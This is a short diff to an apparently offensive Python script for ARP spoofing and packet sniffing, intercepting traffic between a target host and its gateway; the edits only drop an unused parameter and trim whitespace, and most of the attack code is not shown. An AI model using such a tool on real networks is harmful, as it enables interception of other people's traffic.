@@ -19,7 +19,7 @@ def arp_spoof(target_ip, gateway_ip):
     send(gateway_packet)
 
 # Define the packet sniffing function to capture packets between the target and gateway
-def sniff_packets(iface, target_ip, gateway_ip):
+def sniff_packets(iface, target_ip):
     # Define a filter to capture packets only between the target and gateway
     sniff_filter = "ip host " + target_ip
 
@@ -48,7 +48,7 @@ if __name__ == "__main__":
     gateway_ip = sys.argv[2]
 
     # Set the network interface to use for ARP spoofing and packet sniffing
-    iface = "eth0" 
+    iface = "eth0"
 
     # Start ARP spoofing by sending fake ARP packets to the target and gateway
     print("[+] Starting ARP spoofing...")
